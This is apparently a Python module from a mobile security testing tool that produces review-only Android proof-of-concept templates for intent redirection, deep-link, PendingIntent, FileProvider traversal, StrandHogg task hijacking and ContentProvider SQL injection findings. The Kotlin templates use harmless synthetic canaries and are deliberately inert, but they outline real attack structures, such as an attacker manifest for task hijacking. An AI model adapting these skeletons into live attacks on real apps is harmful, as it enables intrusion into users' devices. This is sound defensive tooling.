"""Generate bounded review-only Android PoC templates for synthetic fixtures.

This module never executes generated content. ADB output is explanatory text,
and generated source is limited to canary-oriented review examples; neither is
independent verification or authorization to test a target.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Optional
import re
from pydantic import ValidationError

from mobileag.reporting.finding import Finding
from mobileag.reporting.finding import FindingStatus
from mobileag.reporting.validation import ConfirmationEvidence


@dataclass
class GeneratedPoc:
    finding_id: str
    vulnerability_type: str
    adb_command: str
    kotlin_exploit_code: str
    explanation: str


class ExploitPocSynthesizer:
    """Builds review-only synthetic-canary templates for attested findings."""

    def synthesize(self, finding: Finding, target_package: str) -> Optional[GeneratedPoc]:
        """Synthesize PoC based on finding type and parameters."""
        # Generated commands/source are review artifacts, never proof or authorization
        # to execute. Require a structured, artifact-bound analyst attestation first.
        evidence = finding.validation_evidence or {}
        if (finding.status != FindingStatus.CONFIRMED
                or evidence.get("basis") != "analyst_attested"
                or evidence.get("independently_verified") is not False
                or evidence.get("active") is not True
                or not isinstance(target_package, str)
                or len(target_package) > 255
                or not re.fullmatch(r"[A-Za-z][A-Za-z0-9_]*(?:\.[A-Za-z][A-Za-z0-9_]*)+", target_package)):
            return None
        try:
            record = ConfirmationEvidence.model_validate(evidence.get("record", {}))
        except (ValidationError, TypeError):
            return None
        if record.package_name != target_package:
            return None
        cwe = finding.cwe_id or ""
        fid = finding.id
        # Every value below is interpolated into Kotlin source or an ADB
        # command. Reject rather than attempting to interpret arbitrary metadata.
        if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,128}", fid):
            return None
        component = finding.metadata.get("component_name", f"{target_package}.VulnerableActivity")
        authority = finding.metadata.get("authority", f"{target_package}.provider")
        affinity = finding.metadata.get("task_affinity", target_package)
        uri = finding.metadata.get("uri_scheme", "myapp://vulnerable/action?redirect=https://mobileag.invalid/")
        dotted_identifier = r"[A-Za-z][A-Za-z0-9_]*(?:\.[A-Za-z][A-Za-z0-9_]*)+"
        if (not isinstance(component, str) or not (re.fullmatch(dotted_identifier, component)
                # Kotlin treats '$' as string-template syntax. Keep generated
                # identifiers to literal-safe Java/Kotlin identifier chars.
                or re.fullmatch(dotted_identifier + r"/[A-Za-z][A-Za-z0-9_.]*", component))
                or not isinstance(authority, str) or not re.fullmatch(dotted_identifier, authority)
                or not isinstance(affinity, str) or not re.fullmatch(dotted_identifier, affinity)
                or not isinstance(uri, str) or len(uri) > 2048
                or not re.fullmatch(r"[A-Za-z][A-Za-z0-9+.-]*://[A-Za-z0-9:/?&=._%+~-]+", uri)):
            return None
        if finding.affected_component and not re.fullmatch(r"[A-Za-z][A-Za-z0-9_]*(?:\.[A-Za-z][A-Za-z0-9_]*)*", finding.affected_component):
            return None

        if "INTENT_REDIRECTION" in fid or cwe == "CWE-926":
            return self._synthesize_intent_redirection_poc(finding, target_package)
        elif "DEEP_LINK" in fid or "CWE-601" in cwe:
            return self._synthesize_deep_link_poc(finding, target_package)
        elif "PENDING_INTENT" in fid or cwe == "CWE-927":
            return self._synthesize_pending_intent_poc(finding, target_package)
        elif "FILEPROVIDER" in fid or "FILE_PROVIDER" in fid or cwe == "CWE-22":
            return self._synthesize_file_provider_poc(finding, target_package)
        elif "TASK_AFFINITY" in fid or "TASK_HIJACKING" in fid or cwe == "CWE-1021":
            return self._synthesize_task_hijacking_poc(finding, target_package)
        elif "CONTENT_PROVIDER" in fid or "PROVIDER_SQLI" in fid or (cwe == "CWE-89" and "content" in finding.title.lower()):
            return self._synthesize_content_provider_sqli_poc(finding, target_package)

        return None

    def _synthesize_intent_redirection_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        target_component = finding.metadata.get("component_name", f"{target_package}.VulnerableActivity")
        adb_cmd = "# Review-only: no launch command generated; validate with a researcher-owned canary fixture."

        kotlin_code = f"""// Standalone Exploit PoC for Intent Redirection ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.content.Intent
import android.os.Bundle

class ExploitActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)

        // Use a harmless synthetic marker; never request a privileged action.
        val victimTarget = Intent().apply {{
            action = "org.mobileag.SYNTHETIC_CANARY"
            putExtra("mobileag_canary", "MOBILEAG_SYNTHETIC_CANARY")
        }}

        // Launch proxy component in victim app embedding our payload
        val attackIntent = Intent().apply {{
            setClassName("{target_package}", "{target_component}")
            putExtra("redirect_intent", victimTarget)
        }}

        startActivity(attackIntent)
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="Intent Redirection",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=(
                f"Launches exported component '{target_component}' with a nested intent extra "
                "with a synthetic canary intent. Run only against a researcher-owned fixture."
            ),
        )

    def _synthesize_deep_link_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        uri = finding.metadata.get("uri_scheme", "myapp://vulnerable/action?redirect=https://mobileag.invalid/")
        adb_cmd = "# Review-only: no deep-link dispatch command generated; use a researcher-owned fixture after approval."

        kotlin_code = f"""// Standalone Exploit PoC for Deep Link Navigation ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle

class DeepLinkExploit : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)

        val uri = Uri.parse("{uri}")
        val attack = Intent(Intent.ACTION_VIEW, uri).apply {{
            setPackage("{target_package}")
        }}
        startActivity(attack)
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="Deep Link Vulnerability",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=(f"Review-only dispatch of '{uri}' to researcher-owned fixture package '{target_package}'. "
                         "The default redirect host is reserved under .invalid; validate custom URIs before use."),
        )

    def _synthesize_pending_intent_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        adb_cmd = f"# PendingIntent mutability requires an attacker app installed on the device"
        kotlin_code = f"""// Standalone Exploit PoC for Mutable PendingIntent Mutability ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.app.PendingIntent
import android.content.Intent
import android.os.Bundle

class MutablePendingIntentExploit : Activity() {{
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {{
        super.onActivityResult(requestCode, resultCode, data)
        val stolenPi = data?.getParcelableExtra<PendingIntent>("pending_intent")
        if (stolenPi != null) {{
            // Restrict the fill-in payload to a synthetic canary marker.
            val fillInIntent = Intent().apply {{
                action = "org.mobileag.SYNTHETIC_CANARY"
                putExtra("mobileag_canary", "MOBILEAG_SYNTHETIC_CANARY")
            }}
            // Deliberately do not dispatch: an unknown PendingIntent may execute
            // the creator's real action. Review its target in an owned fixture first.
        }}
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="PendingIntent Mutability",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation="Shows a synthetic fill-in marker for review; it intentionally does not dispatch the PendingIntent.",
        )

    def _synthesize_file_provider_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        authority = finding.metadata.get("authority", f"{target_package}.fileprovider")
        adb_cmd = "# Review-only: use a dedicated synthetic canary fixture; no content-read command is generated."

        kotlin_code = f"""// Standalone Exploit PoC for FileProvider Traversal ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.net.Uri
import android.os.Bundle

class FileProviderExploit : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        // Resolve only to a researcher-created canary file in a test fixture.
        val uri = Uri.parse("content://{authority}/mobileag-fixtures/canary.txt")
        contentResolver.openInputStream(uri)?.use {{ stream ->
            val buffer = ByteArray(64)
            val count = stream.read(buffer)
            val marker = "MOBILEAG_SYNTHETIC_CANARY".toByteArray(Charsets.UTF_8)
            val observed = count == marker.size && buffer.copyOf(count).contentEquals(marker)
            println("Synthetic canary observed: $observed")
        }}
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="FileProvider Directory Traversal",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=f"Checks only a bounded synthetic canary via fixture authority '{authority}'; no app database or raw content is emitted.",
        )

    def _synthesize_task_hijacking_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        target_activity = finding.affected_component or f"{target_package}.MainActivity"
        task_affinity = finding.metadata.get("task_affinity", target_package)
        adb_cmd = "# Review-only: do not launch an overlay; inspect task behavior in a dedicated synthetic fixture."
        kotlin_code = f"""// Standalone Exploit PoC for Task Hijacking / StrandHogg ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.content.Intent
import android.os.Bundle

/**
 * Attacker AndroidManifest.xml configuration:
 * <activity
 *     android:name=".StrandHoggActivity"
 *     android:taskAffinity="{task_affinity}"
 *     android:allowTaskReparenting="true"
 *     android:exported="true">
 *     <intent-filter>
 *         <action android:name="android.intent.action.MAIN" />
 *         <category android:name="android.intent.category.LAUNCHER" />
 *     </intent-filter>
 * </activity>
 */
class StrandHoggActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        // Intentionally inert: no overlay, UI spoofing, or data capture.
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="Task Affinity / StrandHogg Hijacking",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=(
                f"Shows the taskAffinity candidate '{task_affinity}' for review only. "
                f"No overlay or credential capture is implemented; fixture activity: '{target_activity}'."
            ),
        )

    def _synthesize_content_provider_sqli_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
        authority = finding.metadata.get("authority", f"{target_package}.provider")
        uri = f"content://{authority}/synthetic-canary"
        projection = "mobileag_synthetic_canary"
        adb_cmd = (f"# Review-only fixture query: authority={authority}, path=/synthetic-canary, "
                   f"projection={projection}; do not query production data.")
        kotlin_code = f"""// Standalone Exploit PoC for ContentProvider SQL Injection ({finding.id})
package com.attacker.exploit

import android.app.Activity
import android.net.Uri
import android.os.Bundle

class ProviderSqliExploit : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        val uri = Uri.parse("{uri}")
        val cursor = contentResolver.query(uri, arrayOf("{projection}"), null, null, null)
        cursor?.use {{ c ->
            val observed = c.moveToFirst() && c.getString(0) == "MOBILEAG_SYNTHETIC_CANARY"
            println("Synthetic canary observed: $observed")
        }}
    }}
}}
"""
        return GeneratedPoc(
            finding_id=finding.id,
            vulnerability_type="ContentProvider SQL Injection",
            adb_command=adb_cmd,
            kotlin_exploit_code=kotlin_code,
            explanation=f"Queries only a named synthetic canary projection on fixture authority '{authority}'; this is not proof of SQL injection.",
        )

